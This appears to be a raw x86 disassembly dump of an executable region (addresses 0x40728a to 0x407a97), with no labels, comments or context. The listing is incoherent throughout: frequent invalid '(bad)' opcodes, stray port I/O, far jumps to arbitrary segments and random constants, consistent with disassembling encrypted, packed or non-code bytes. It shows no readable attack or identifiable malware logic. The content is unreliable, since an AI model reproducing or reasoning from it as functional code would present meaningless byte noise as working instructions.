  40728a:	adc    BYTE PTR [eax-0x6a],ah
  40728d:	or     al,BYTE PTR [ebx-0x24114fca]
  407293:	sub    DWORD PTR [ebp-0x5f],eax
  407296:	imul   ebp,DWORD PTR [ebx-0x1ded17f1],0xffffffcf
  40729d:	push   edx
  40729e:	repnz es xchg edi,eax
  4072a1:	(bad)  
  4072a2:	pop    eax
  4072a3:	mov    esp,0xf58e8718
  4072a8:	fist   WORD PTR [eax]
  4072aa:	cmc    
  4072ab:	cld    
  4072ac:	in     al,dx
  4072ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072ae:	cmp    eax,0x2b73b2a0
  4072b3:	fwait
  4072b4:	lods   al,BYTE PTR ds:[esi]
  4072b5:	shld   DWORD PTR [eax+0x4b],esi,0xde
  4072ba:	dec    ecx
  4072bb:	and    BYTE PTR [ebx-0x612fa3ea],ah
  4072c1:	xchg   ecx,eax
  4072c2:	pop    ecx
  4072c3:	mov    ds:0xc3d7af63,eax
  4072c8:	mov    bl,0x60
  4072ca:	pop    ds
  4072cb:	xchg   esi,eax
  4072cc:	cmp    bl,dl
  4072ce:	xor    BYTE PTR [eax+0x61],0xa9
  4072d2:	popa   
  4072d3:	loop   0x40728e
  4072d5:	push   ebp
  4072d6:	loope  0x4072ec
  4072d8:	mul    DWORD PTR ds:0x87c9de8f
  4072de:	mov    esp,0xfe460a90
  4072e3:	jns    0x407268
  4072e5:	push   eax
  4072e6:	fs iret 
  4072e8:	adc    eax,0xe50dfbd4
  4072ed:	sbb    BYTE PTR gs:[ebp+0x30],ah
  4072f1:	fisttp WORD PTR [esi+0x709f7eae]
  4072f7:	or     edx,ecx
  4072f9:	scas   eax,DWORD PTR es:[edi]
  4072fa:	mov    DWORD PTR [ecx],ebx
  4072fc:	jl     0x407364
  4072fe:	sub    esi,DWORD PTR [ecx+ecx*4+0x0]
  407302:	mov    ch,0x7c
  407304:	add    ecx,DWORD PTR [ebp-0xd]
  407307:	xchg   edx,eax
  407308:	cmp    BYTE PTR [edx+0x1],bh
  40730b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40730c:	(bad)  
  40730d:	call   0x1a5e:0xa53f3afa
  407314:	jae    0x407389
  407316:	mov    esp,0x8b0ee6dd
  40731b:	and    eax,0x141cb6ef
  407320:	imul   ecx,DWORD PTR [ecx],0xffffffd3
  407323:	and    DWORD PTR [ebx-0x6267ae71],0x52
  40732a:	xor    dl,BYTE PTR [esi]
  40732c:	mov    ecx,0x95fd6dfc
  407331:	dec    ebp
  407332:	neg    BYTE PTR [eax+ebx*1-0x6b]
  407336:	xchg   ecx,eax
  407337:	fwait
  407338:	shl    ecx,cl
  40733a:	cmp    edx,0x51d9cc1
  407340:	(bad)  
  407341:	shl    BYTE PTR [ebp+0x1a],1
  407344:	mov    edi,0xf097e8e9
  407349:	jns    0x40739b
  40734b:	int    0xec
  40734d:	lock paddd mm1,mm0
  407351:	rcr    DWORD PTR [edx],cl
  407353:	jnp    0x40738e
  407355:	push   cs
  407356:	adc    edi,DWORD PTR [edi+esi*1+0x2e]
  40735a:	pop    ebx
  40735b:	mov    ah,BYTE PTR [esi]
  40735d:	dec    eax
  40735e:	imul   ecx,DWORD PTR [edi+ecx*8+0x46d83a23],0x23
  407366:	loope  0x4073de
  407368:	jle    0x4073b9
  40736a:	dec    ebp
  40736b:	jmp    0x5b97:0xa6fd571f
  407372:	popa   
  407373:	arpl   di,sp
  407375:	hlt    
  407376:	cmp    bh,0xe4
  407379:	add    bh,BYTE PTR [esi]
  40737b:	add    dh,BYTE PTR [esi+0x7bc8f38d]
  407381:	imul   edi,edx,0xffffffe6
  407384:	jae    0x4073aa
  407386:	pusha  
  407387:	ret    0x8b31
  40738a:	outs   dx,DWORD PTR ds:[esi]
  40738b:	leave  
  40738c:	hlt    
  40738d:	xlat   BYTE PTR ds:[ebx]
  40738e:	test   al,0x18
  407390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407391:	jnp    0x4073ea
  407393:	pusha  
  407394:	test   DWORD PTR [edx-0x2fec959c],0xed65dd68
  40739e:	lea    edx,[ebx]
  4073a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073a1:	add    edx,eax
  4073a3:	daa    
  4073a4:	mov    ?,WORD PTR [ebx-0x2da5e8a]
  4073aa:	shl    esp,cl
  4073ac:	ret    0x562
  4073af:	mov    ebx,0xec8fea5f
  4073b4:	mov    ecx,0x20bab5fb
  4073b9:	push   ds
  4073ba:	add    DWORD PTR [ebx-0x123f15df],0x5cdf3fca
  4073c4:	fdiv   DWORD PTR [ebx-0x7de29984]
  4073ca:	fadd   st,st(4)
  4073cc:	jle    0x4073cb
  4073ce:	jmp    0x4073d3
  4073d0:	and    BYTE PTR [esi+0x7c23ce9c],al
  4073d6:	ja     0x407405
  4073d8:	mov    es,WORD PTR [edi+0x63]
  4073db:	mov    ch,0xa2
  4073dd:	fistp  WORD PTR [edx+0x5b128670]
  4073e3:	ret    0x1d74
  4073e6:	dec    edx
  4073e7:	push   DWORD PTR [ecx]
  4073e9:	inc    eax
  4073ea:	hlt    
  4073eb:	fist   DWORD PTR [eax]
  4073ed:	mov    al,ds:0xa40fcfa0
  4073f2:	add    eax,0xe62401ea
  4073f7:	pop    esp
  4073f8:	pop    ss
  4073f9:	jge    0x40739f
  4073fb:	jecxz  0x40745f
  4073fd:	pop    ecx
  4073fe:	sbb    BYTE PTR [eax+0x6d00b780],0x68
  407405:	cmp    bh,cl
  407407:	and    al,0x7d
  407409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40740a:	mov    ecx,0x288522ab
  40740f:	mov    edi,0x313fcd85
  407414:	adc    eax,0xd90cae7d
  407419:	stc    
  40741a:	psrlq  mm3,QWORD PTR [ecx-0x743b1bd5]
  407421:	nop
  407422:	ins    BYTE PTR es:[edi],dx
  407423:	xor    DWORD PTR [ebx*4-0x55738dda],0xe578d95a
  40742e:	int    0xf6
  407430:	dec    ebx
  407431:	inc    esi
  407432:	and    eax,0xc42cd239
  407437:	outs   dx,BYTE PTR ds:[esi]
  407438:	mov    al,ds:0x30eb11ba
  40743d:	shl    DWORD PTR [ebp+0x324c38c9],0xd
  407444:	sbb    ebx,DWORD PTR ds:0x77a93298
  40744a:	(bad)  
  40744b:	xchg   ebx,eax
  40744c:	mov    esp,0x869e5aa8
  407451:	jb     0x407403
  407453:	mov    ah,0x3
  407455:	lahf   
  407456:	arpl   WORD PTR [ecx-0x65],sp
  407459:	mov    bh,0x3b
  40745b:	rcl    DWORD PTR [ecx-0x6f],cl
  40745e:	dec    edx
  40745f:	bound  esi,QWORD PTR [ebx]
  407461:	pop    edx
  407462:	pop    es
  407463:	push   es
  407464:	add    bl,dl
  407466:	mov    bh,0xf6
  407468:	or     al,0xad
  40746a:	or     DWORD PTR [eax+0x6e],0xffffffe5
  40746e:	jnp    0x4074a7
  407470:	(bad)  
  407472:	shl    dh,cl
  407474:	xchg   edi,eax
  407475:	xchg   esi,eax
  407476:	fbstp  TBYTE PTR ds:0x8c815811
  40747c:	adc    esi,esp
  40747e:	mov    ah,0x20
  407480:	mov    cs,WORD PTR [eax+0x4ef74369]
  407486:	xchg   BYTE PTR [ebx+0x5d54f99d],bh
  40748c:	and    eax,0xf2b3d691
  407491:	mov    ecx,0xa6a99aaf
  407496:	js     0x407444
  407498:	and    ebp,DWORD PTR ds:0xd7425b69
  40749e:	repz cmp BYTE PTR [ebx+esi*8-0x4f14512d],al
  4074a6:	mov    dl,0x62
  4074a8:	and    DWORD PTR gs:[eax+0x52e9c791],0x52f7c0ce
  4074b3:	or     DWORD PTR [esi],esp
  4074b5:	inc    ecx
  4074b6:	push   ds
  4074b7:	pop    esi
  4074b8:	es pop es
  4074ba:	or     eax,0x6f9b6f7f
  4074bf:	int3   
  4074c0:	test   BYTE PTR [ebp-0x1e5d8355],al
  4074c6:	iret   
  4074c7:	push   edx
  4074c8:	dec    esi
  4074c9:	test   al,0x7b
  4074cb:	iret   
  4074cc:	push   ebp
  4074cd:	xchg   BYTE PTR [edi+0x2e],dh
  4074d0:	loop   0x40753e
  4074d2:	inc    ecx
  4074d3:	add    DWORD PTR [eax],esi
  4074d5:	repnz xor bl,BYTE PTR [edi+0x50d72ab1]
  4074dc:	clc    
  4074dd:	mov    eax,ds:0xa4ca9991
  4074e2:	mov    es,WORD PTR [ecx]
  4074e4:	or     al,0x75
  4074e6:	imul   esi,DWORD PTR [ecx+ebp*4],0xffffffa1
  4074ea:	sub    DWORD PTR [ebx],edi
  4074ec:	or     ebx,esi
  4074ee:	fcom   DWORD PTR [eax+edx*2]
  4074f1:	jo     0x4074ba
  4074f3:	loop   0x40756d
  4074f5:	fwait
  4074f6:	jbe    0x4074c5
  4074f8:	arpl   WORD PTR [ebx-0x64],di
  4074fb:	and    esi,DWORD PTR [edi+0x400ec3ba]
  407501:	and    eax,0xb85de05a
  407506:	xor    dl,bh
  407508:	mov    dh,0xb9
  40750a:	shl    DWORD PTR [ecx],cl
  40750c:	sbb    al,0xb6
  40750e:	mov    al,ds:0x8b9cdd68
  407513:	xchg   edi,eax
  407514:	mov    ch,0xd5
  407516:	daa    
  407517:	out    0x5f,al
  407519:	fistp  DWORD PTR [edx-0x15]
  40751c:	pop    ebx
  40751d:	clc    
  40751e:	inc    esi
  40751f:	push   edx
  407520:	fwait
  407521:	lahf   
  407522:	cld    
  407523:	(bad)  
  407524:	add    DWORD PTR [eax+0x1ea1955a],ecx
  40752a:	jno    0x40754e
  40752c:	mov    ds:0xe3438511,al
  407531:	retf   
  407532:	retf   
  407533:	std    
  407534:	mov    ah,0x90
  407536:	leave  
  407537:	stos   BYTE PTR es:[edi],al
  407538:	ins    DWORD PTR es:[edi],dx
  407539:	mov    eax,0xac200199
  40753e:	cmp    dh,BYTE PTR [eax-0x1d1b57a1]
  407544:	xchg   ebx,eax
  407545:	sub    al,0x29
  407547:	push   ecx
  407548:	xchg   dl,dh
  40754a:	outs   dx,BYTE PTR ds:[esi]
  40754b:	and    esp,DWORD PTR [edx]
  40754d:	pop    esp
  40754e:	cmp    DWORD PTR [edx-0x5],esp
  407551:	cmp    al,0x99
  407553:	leave  
  407554:	into   
  407555:	push   cs
  407556:	mov    ch,0x58
  407558:	xchg   DWORD PTR [eax+0x58caf32b],ecx
  40755e:	jl     0x40750c
  407560:	xchg   ebp,eax
  407561:	test   BYTE PTR [ebp+0x7a7339e0],bl
  407567:	loop   0x407515
  407569:	or     edi,edi
  40756b:	int    0xf7
  40756d:	test   edx,esi
  40756f:	pop    ss
  407570:	outs   dx,BYTE PTR ds:[esi]
  407571:	popa   
  407572:	push   ebx
  407573:	jmp    0x4075b2
  407575:	test   eax,0xf2ff6fdf
  40757a:	xchg   DWORD PTR [ecx],edi
  40757c:	ins    BYTE PTR es:[edi],dx
  40757d:	mov    WORD PTR [ebx],?
  40757f:	movzx  ebp,ax
  407582:	mov    WORD PTR [ebx],cs
  407584:	jbe    0x40750c
  407586:	and    DWORD PTR [edi-0x5a1ce083],ecx
  40758c:	mov    eax,ds:0x96914dda
  407591:	pop    ebp
  407592:	icebp  
  407593:	mov    esp,0x47044437
  407598:	les    esp,FWORD PTR [edi+0x30]
  40759b:	and    al,0xca
  40759d:	cmp    ebp,DWORD PTR [edi]
  40759f:	inc    ebx
  4075a0:	pop    esp
  4075a1:	vpsubb xmm3,xmm4,XMMWORD PTR [ebx+0x4221e5eb]
  4075a9:	adc    bl,BYTE PTR [esi]
  4075ab:	out    0xb8,eax
  4075ad:	stc    
  4075ae:	je     0x407560
  4075b0:	retf   
  4075b1:	data16 aad 0x59
  4075b4:	(bad)  
  4075b7:	cmp    al,0x7e
  4075b9:	in     al,0x6
  4075bb:	jg     0x40760a
  4075bd:	aas    
  4075be:	xor    eax,0x3f5dd88d
  4075c4:	sbb    al,0xfc
  4075c6:	and    al,0xd4
  4075c8:	inc    ebx
  4075c9:	hlt    
  4075ca:	inc    edi
  4075cb:	rcr    DWORD PTR [eax-0x32],cl
  4075ce:	inc    edx
  4075cf:	adc    eax,DWORD PTR [edx-0x13]
  4075d2:	jae    0x407581
  4075d4:	test   DWORD PTR [edx-0x50],edi
  4075d7:	pop    edx
  4075d8:	adc    DWORD PTR ds:0x4328d240,ecx
  4075de:	inc    edi
  4075df:	pop    esi
  4075e0:	mov    ds:0x57023003,eax
  4075e5:	ret    0xbe53
  4075e8:	jp     0x4075f5
  4075ea:	stos   DWORD PTR es:[edi],eax
  4075eb:	push   ecx
  4075ec:	mov    ebp,DWORD PTR [ecx+edi*1+0x34]
  4075f0:	dec    esi
  4075f1:	mov    edx,0x2f731d83
  4075f6:	mov    DWORD PTR [ebx+0x194da70],ebx
  4075fc:	hlt    
  4075fd:	(bad)  
  4075fe:	cli    
  4075ff:	sbb    DWORD PTR [esi],ebp
  407601:	or     al,0x79
  407603:	imul   DWORD PTR [edi+0x7f4e6fbe]
  407609:	ins    BYTE PTR es:[edi],dx
  40760a:	mov    ch,0xbf
  40760c:	inc    edx
  40760d:	xor    al,0x8
  40760f:	xchg   esp,eax
  407610:	int3   
  407611:	xor    DWORD PTR [ebx-0x62],ebp
  407614:	(bad)  
  407615:	push   ds
  407616:	push   ss
  407617:	ret    
  407618:	out    dx,eax
  407619:	arpl   WORD PTR [ebx],si
  40761b:	and    edi,esi
  40761d:	test   al,0xe1
  40761f:	imul   esi,esi,0x9946a12a
  407625:	xchg   ebx,esi
  407627:	test   al,0x89
  407629:	scas   eax,DWORD PTR es:[edi]
  40762a:	js     0x40769f
  40762c:	jmp    0x35dd:0xaa1aee5d
  407633:	xchg   edi,eax
  407634:	popf   
  407635:	shr    BYTE PTR [ecx-0x3837cd8],0x2c
  40763c:	(bad)  [ebx-0x3e9e5e88]
  407642:	cmp    DWORD PTR [ebx],esi
  407644:	mov    bl,0xde
  407646:	aad    0x6b
  407648:	mov    dl,0xa6
  40764a:	xor    al,0xe7
  40764c:	rcr    bl,cl
  40764e:	cmp    al,0x2f
  407650:	mov    eax,ecx
  407652:	inc    eax
  407653:	sub    ecx,DWORD PTR [ecx+esi*1+0x5c]
  407657:	je     0x40769b
  407659:	rcl    DWORD PTR [ebp-0x3],cl
  40765c:	cdq    
  40765d:	stc    
  40765e:	sub    esi,ebx
  407660:	adc    ebp,ecx
  407662:	aaa    
  407663:	push   cs
  407664:	sar    DWORD PTR [ecx+edi*4+0x4f],0xaf
  407669:	mov    al,0xfc
  40766b:	and    BYTE PTR [ecx+0x49f0d79c],dl
  407671:	sub    BYTE PTR [ecx-0x988c0d9],bl
  407677:	sti    
  407678:	cmp    al,0x42
  40767a:	mov    ds:0x1b0a16f5,eax
  40767f:	call   0xf08a3113
  407684:	xchg   ecx,eax
  407685:	pop    es
  407686:	fnsave [edx-0xc]
  407689:	add    BYTE PTR [edi-0x52b042b4],dl
  40768f:	pop    ebx
  407690:	js     0x407699
  407692:	xchg   edi,eax
  407693:	or     eax,0xef543f04
  407698:	sub    DWORD PTR ds:0x38432e9a,ebx
  40769e:	ja     0x40762a
  4076a0:	inc    ebx
  4076a1:	mov    al,0x3b
  4076a3:	ja     0x407672
  4076a5:	in     eax,0xc9
  4076a7:	mov    ds:0x9aebbdc4,eax
  4076ac:	pop    edx
  4076ad:	adc    DWORD PTR [edx-0x2e],0xbcde50aa
  4076b4:	stc    
  4076b5:	xchg   esp,eax
  4076b6:	adc    al,0xa3
  4076b8:	mov    al,0xc3
  4076bb:	cmp    DWORD PTR [ebx],esp
  4076bd:	pop    edx
  4076be:	xchg   BYTE PTR [ebx],bh
  4076c0:	out    dx,al
  4076c1:	inc    edi
  4076c2:	leave  
  4076c3:	and    ah,dl
  4076c5:	in     al,dx
  4076c6:	jmp    0x2055:0x5e8c2e62
  4076cd:	xchg   edx,eax
  4076ce:	cmp    BYTE PTR [esi-0x26302a2c],bl
  4076d4:	push   0xffffffd4
  4076d6:	xor    dh,BYTE PTR [edx+ebx*8]
  4076d9:	sar    DWORD PTR [ecx+0x67],0xe4
  4076dd:	enter  0xb6c0,0x40
  4076e1:	xor    bh,BYTE PTR [eax+0x49fe9f53]
  4076e7:	ret    
  4076e8:	es lahf 
  4076ea:	dec    eax
  4076eb:	mov    esi,0x1392373a
  4076f0:	clc    
  4076f1:	jmp    0x4076ff
  4076f3:	scas   eax,DWORD PTR es:[edi]
  4076f4:	pop    eax
  4076f5:	mov    eax,eax
  4076f7:	jne    0x4076ad
  4076f9:	pop    ecx
  4076fa:	ror    BYTE PTR [ecx],1
  4076fc:	mov    edx,0xd7e4341a
  407701:	sub    al,0xa7
  407703:	frstor [edx]
  407705:	and    eax,0xa3340717
  40770a:	sar    DWORD PTR [ebp+0x7ce0286f],0xb1
  407711:	cmp    eax,0xeb63aec7
  407716:	inc    eax
  407717:	adc    dl,BYTE PTR [edi]
  407719:	push   ecx
  40771a:	out    0x43,al
  40771c:	inc    edi
  40771d:	jmp    0x407779
  40771f:	push   edi
  407720:	inc    eax
  407721:	sahf   
  407722:	push   ss
  407723:	call   0x6714b437
  407728:	dec    esi
  407729:	pop    edx
  40772a:	xor    BYTE PTR [ebx-0x3],bh
  40772d:	xlat   BYTE PTR ds:[ebx]
  40772e:	fwait
  40772f:	dec    edx
  407730:	enter  0x44e6,0x4b
  407734:	les    ecx,FWORD PTR [eax+0x24]
  407737:	clc    
  407738:	sub    eax,0x31d660eb
  40773d:	push   ecx
  40773e:	fimul  WORD PTR [ebx+ecx*8+0x7a]
  407742:	scas   al,BYTE PTR es:[edi]
  407743:	inc    DWORD PTR [eax+0x2ab6dec1]
  407749:	addr16 inc esi
  40774b:	inc    edi
  40774c:	ror    ebx,cl
  40774e:	and    BYTE PTR [ecx-0x19],cl
  407751:	and    BYTE PTR [edi],cl
  407753:	mov    al,ds:0x4121b2a4
  407758:	mov    ?,eax
  40775a:	mov    ?,WORD PTR [edi]
  40775c:	adc    al,0x26
  40775e:	add    DWORD PTR [ebp-0x23906948],ebx
  407764:	xor    DWORD PTR [edi],esi
  407766:	adc    dh,BYTE PTR [ebx+ebx*2+0xf]
  40776a:	neg    DWORD PTR [eax+0x7affeca7]
  407770:	aaa    
  407771:	push   cs
  407772:	and    DWORD PTR [edi-0x4c882a3d],esp
  407778:	adc    al,0x5b
  40777a:	ret    
  40777b:	fbld   TBYTE PTR [ecx+0x34]
  40777e:	popa   
  40777f:	pop    edi
  407780:	(bad)  
  407781:	adc    DWORD PTR [ebx+0x1566c265],ebp
  407787:	loop   0x4077a1
  407789:	mov    cl,0xd1
  40778b:	sub    cl,BYTE PTR [edx+0x77683998]
  407791:	fs push edi
  407793:	xor    al,0xd1
  407795:	sbb    DWORD PTR [ebx+edi*2+0x4f],esi
  407799:	into   
  40779a:	mov    al,0xf3
  40779c:	dec    eax
  40779d:	je     0x4077d6
  40779f:	xor    al,BYTE PTR [ecx]
  4077a1:	add    eax,0xc8e2aa0e
  4077a6:	(bad)  
  4077a7:	test   bh,0xa3
  4077aa:	push   eax
  4077ab:	fucomp st(3)
  4077ad:	inc    eax
  4077ae:	ror    BYTE PTR [ebp+0x73],cl
  4077b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077b2:	frstor [bp+si]
  4077b5:	cmp    ch,BYTE PTR [ecx]
  4077b7:	jne    0x4077dc
  4077b9:	mov    ?,edi
  4077bb:	inc    esi
  4077bc:	sti    
  4077bd:	mov    DWORD PTR [esi+0xa617718],edi
  4077c3:	pop    ecx
  4077c4:	inc    ebx
  4077c5:	(bad)  
  4077c7:	clc    
  4077c8:	sub    bh,BYTE PTR [ebx-0x670ff1a6]
  4077ce:	enter  0x291b,0x32
  4077d2:	push   0x1ce4dba6
  4077d7:	jbe    0x4077b2
  4077d9:	xor    eax,0xf3c3d0bd
  4077de:	repnz hlt 
  4077e0:	push   ss
  4077e1:	test   BYTE PTR ds:0x66ddd1d2,dh
  4077e7:	dec    edi
  4077e8:	mov    al,ds:0x907f3525
  4077ed:	pop    ebp
  4077ee:	outs   dx,BYTE PTR ds:[esi]
  4077ef:	inc    esp
  4077f0:	pop    esp
  4077f1:	rcl    DWORD PTR [esi],1
  4077f3:	cs (bad) 
  4077f5:	mov    edx,0xa230f59d
  4077fa:	or     eax,0xdfe3d113
  4077ff:	pusha  
  407800:	xchg   DWORD PTR [esi-0x5a39c243],edi
  407806:	cli    
  407807:	mov    edi,0xc6238060
  40780c:	lahf   
  40780d:	sbb    BYTE PTR [edi],dl
  40780f:	jno    0x4077c1
  407811:	popa   
  407812:	inc    ecx
  407813:	or     al,0x36
  407815:	in     al,dx
  407816:	xor    ah,bh
  407818:	add    eax,0x8b875cbc
  40781e:	jp     0x4077df
  407820:	inc    ebp
  407821:	aaa    
  407822:	test   eax,0xe625ef4c
  407827:	mov    esp,0x26194418
  40782c:	mov    ds:0x78a0bb5b,al
  407831:	mov    ebp,0xff03bd75
  407836:	and    al,0xc7
  407838:	push   esi
  407839:	and    al,BYTE PTR [esi-0x2ae3a49b]
  40783f:	mov    eax,0xe85f48d7
  407844:	push   ecx
  407845:	aas    
  407846:	cli    
  407847:	push   0x1eb86551
  40784c:	arpl   WORD PTR ds:0x742531a2,bx
  407852:	(bad)  
  407853:	pop    ss
  407854:	and    esi,ebp
  407856:	add    DWORD PTR [ebx-0x7f],ebx
  407859:	jns    0x407865
  40785b:	push   0xd4de5619
  407860:	loopne 0x40785c
  407862:	aad    0x6b
  407864:	push   cs
  407865:	push   es
  407866:	inc    edx
  407867:	add    eax,0xeb891be9
  40786c:	pushf  
  40786d:	out    dx,al
  40786e:	out    0x79,eax
  407870:	test   eax,0xa64002b5
  407875:	or     al,0x9f
  407877:	jbe    0x40784d
  407879:	in     eax,dx
  40787a:	xchg   ecx,eax
  40787b:	and    al,BYTE PTR [edi]
  40787d:	inc    ebx
  40787e:	jg     0x407857
  407880:	sbb    eax,0xda402f5b
  407885:	call   0x7ec7:0x45f56de2
  40788c:	cs push ebx
  40788e:	ret    0x792a
  407891:	inc    eax
  407892:	sub    bl,BYTE PTR [edx+0x6a]
  407895:	cmp    DWORD PTR [esi+0x66],edx
  407898:	xchg   ebp,eax
  407899:	aas    
  40789a:	mov    bh,0xf6
  40789c:	jnp    0x4078da
  40789e:	add    cl,BYTE PTR [ecx]
  4078a0:	pop    esi
  4078a1:	cdq    
  4078a2:	lahf   
  4078a3:	in     al,0xa0
  4078a5:	ja     0x4078e2
  4078a7:	pop    ebp
  4078a8:	mov    ebx,0xd55cbc68
  4078ad:	lods   eax,DWORD PTR ds:[esi]
  4078ae:	out    0x67,eax
  4078b0:	retf   0xa4fa
  4078b3:	or     bl,dl
  4078b5:	lea    ebx,[edi]
  4078b7:	mov    ch,0xa2
  4078b9:	into   
  4078ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078bb:	jecxz  0x4078ca
  4078bd:	sbb    al,0xa3
  4078bf:	dec    esi
  4078c0:	cmp    edx,edi
  4078c2:	push   esi
  4078c3:	js     0x407877
  4078c5:	cmp    ecx,DWORD PTR [ebp+0x2f]
  4078c8:	cmc    
  4078c9:	sub    esi,DWORD PTR [esi]
  4078cb:	xchg   dl,bh
  4078cd:	jmp    0x97a9:0xed0d70c5
  4078d4:	(bad)  
  4078d5:	out    dx,eax
  4078d6:	arpl   dx,ax
  4078d8:	ds xor eax,0x4c241c3a
  4078de:	data16 shl BYTE PTR [ecx+0x6e],1
  4078e2:	fcomp  QWORD PTR [ecx-0x44c5ba6b]
  4078e8:	sbb    edi,DWORD PTR [edx]
  4078ea:	sbb    eax,0xd9473a75
  4078ef:	lds    ebx,FWORD PTR [ecx-0x1b]
  4078f2:	sbb    eax,0x305da694
  4078f7:	or     DWORD PTR [edi+0x4c7278e0],esi
  4078fd:	lods   eax,DWORD PTR ds:[esi]
  4078fe:	enter  0xbb95,0x22
  407902:	cld    
  407903:	pop    ebx
  407904:	mov    al,ds:0xd3cfdff8
  407909:	aad    0x4d
  40790b:	cmp    bh,BYTE PTR [ecx+eax*4-0x766ca5e4]
  407912:	in     eax,0x33
  407914:	mov    ds:0xa1901010,eax
  407919:	adc    al,0x55
  40791b:	dec    eax
  40791c:	addr16 retf 
  40791e:	outs   dx,BYTE PTR ds:[esi]
  40791f:	out    dx,al
  407920:	daa    
  407921:	or     DWORD PTR [eax-0x1e],edi
  407924:	or     ch,cl
  407926:	ins    DWORD PTR es:[edi],dx
  407927:	imul   edx,DWORD PTR [ecx+0x7a],0xffffffe7
  40792b:	inc    eax
  40792c:	and    BYTE PTR cs:[ebp+0x1ddbf3ec],ch
  407933:	pop    ecx
  407934:	xchg   edx,eax
  407935:	dec    edx
  407936:	push   0xfb93f320
  40793b:	stos   DWORD PTR es:[edi],eax
  40793c:	(bad)  
  40793e:	jp     0x407985
  407940:	fcomp  DWORD PTR [ebx+0x374374d7]
  407946:	rol    BYTE PTR [esi-0x7146817b],0x51
  40794d:	cmp    eax,0x835f1522
  407952:	rcr    BYTE PTR [ebp-0x4a7b3f2],cl
  407958:	or     DWORD PTR [edx+0x16],ecx
  40795b:	stos   DWORD PTR es:[edi],eax
  40795c:	dec    ecx
  40795d:	sub    esi,DWORD PTR [eax+0x27]
  407960:	and    edx,DWORD PTR [ebp+0x45af8160]
  407966:	fbstp  TBYTE PTR [edi-0x6e562818]
  40796c:	cmp    ch,BYTE PTR [ecx-0x273e6fb]
  407972:	mov    edx,0x6452484f
  407977:	dec    eax
  407978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407979:	jmp    0x733d:0xafc115e2
  407980:	push   0xbd618202
  407985:	loope  0x40795e
  407987:	sub    esi,edx
  407989:	mov    edi,0xba902b8
  40798e:	add    BYTE PTR [edi],dl
  407990:	jns    0x40797a
  407992:	pop    ecx
  407993:	cmc    
  407994:	inc    esp
  407995:	fsub   QWORD PTR [edx+0x73]
  407998:	stc    
  407999:	shl    bl,1
  40799b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40799c:	je     0x4079b9
  40799e:	out    0x25,al
  4079a0:	and    al,dh
  4079a2:	ins    BYTE PTR es:[edi],dx
  4079a3:	pop    eax
  4079a4:	aad    0xb3
  4079a6:	fbstp  TBYTE PTR [edi+0x53]
  4079a9:	sub    DWORD PTR [ebx-0xdb8d8a6],edi
  4079af:	xchg   ebx,eax
  4079b0:	dec    ebp
  4079b1:	hlt    
  4079b2:	fmul   QWORD PTR [edi-0x36]
  4079b5:	dec    ecx
  4079b6:	and    eax,0x48c1fa5e
  4079bb:	leave  
  4079bc:	aam    0xf7
  4079be:	outs   dx,DWORD PTR ds:[esi]
  4079bf:	xchg   esi,eax
  4079c0:	dec    esi
  4079c1:	and    edx,DWORD PTR [ebp-0x57b000d7]
  4079c7:	jne    0x4079a5
  4079c9:	(bad)
  4079cd:	repz cmc 
  4079cf:	loope  0x407962
  4079d1:	aaa    
  4079d2:	(bad)  
  4079d3:	hlt    
  4079d4:	fwait
  4079d5:	pop    es
  4079d6:	xor    al,0xcc
  4079d8:	mov    esp,0xc70df4e2
  4079dd:	xor    ch,BYTE PTR [edi-0x30]
  4079e0:	es mov edi,0xaf32dad4
  4079e6:	cwde   
  4079e7:	stos   BYTE PTR es:[edi],al
  4079e8:	in     al,0x23
  4079ea:	mov    al,ds:0xa8c17287
  4079ef:	fld    TBYTE PTR [eax-0x75]
  4079f2:	add    eax,0xa0b8cd47
  4079f7:	aad    0x6b
  4079f9:	inc    esi
  4079fa:	fdivr  st(6),st
  4079fc:	aam    0x3
  4079fe:	adc    dl,BYTE PTR ds:0xeb898fdd
  407a04:	lea    esp,[edi+0x61]
  407a07:	mov    dh,al
  407a09:	loop   0x407a18
  407a0b:	add    DWORD PTR [eax+0x692b3f0c],eax
  407a11:	scas   eax,DWORD PTR es:[edi]
  407a12:	pop    esi
  407a13:	push   es
  407a14:	adc    al,0xef
  407a16:	lds    esp,FWORD PTR [ebp+0xb5b2496]
  407a1c:	test   dl,0xb5
  407a1f:	ss sahf 
  407a21:	fs mov esi,0x82786088
  407a27:	jno    0x4079b5
  407a29:	push   ebp
  407a2a:	mov    esi,0xe7735c8d
  407a2f:	mov    ebx,DWORD PTR ds:0xaeb5f66a
  407a35:	push   0x23aa7444
  407a3a:	sub    DWORD PTR [esi-0x49be02d4],ecx
  407a40:	pushf  
  407a41:	add    DWORD PTR [ebp+edx*2-0x3eac1f7c],ebx
  407a48:	pop    ebx
  407a49:	fnstenv [ecx+0x7a798a34]
  407a4f:	mov    esi,0x6f699f20
  407a54:	adc    dl,ch
  407a56:	xchg   BYTE PTR [eax+0x2dacd0f9],bl
  407a5c:	rcl    BYTE PTR [ebx-0x5529b8a3],1
  407a62:	dec    ecx
  407a63:	add    eax,0x2a1bcbc2
  407a68:	das    
  407a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a6a:	add    eax,0x4a79e9ed
  407a6f:	in     eax,0x47
  407a71:	jmp    0x407a27
  407a73:	ins    BYTE PTR es:[edi],dx
  407a74:	push   esi
  407a75:	aad    0xbf
  407a77:	outs   dx,DWORD PTR ds:[esi]
  407a78:	lods   al,BYTE PTR ds:[esi]
  407a79:	push   ebp
  407a7a:	xlat   BYTE PTR ds:[ebx]
  407a7b:	fldenv [eax]
  407a7d:	mov    dh,0xf4
  407a7f:	jmp    0x407adc
  407a81:	ror    BYTE PTR [eax],1
  407a83:	sbb    DWORD PTR [ecx+ebx*1],ebx
  407a86:	inc    ecx
  407a87:	fs push 0xffffffe3
  407a8a:	mov    dh,0xd
  407a8c:	mov    ah,0x44
  407a8e:	inc    esi
  407a8f:	mov    al,ds:0x77b5423a
  407a94:	jnp    0x407a85
  407a96:	lods   eax,DWORD PTR ds:[esi]
  407a97:	gs mov bl,0x94
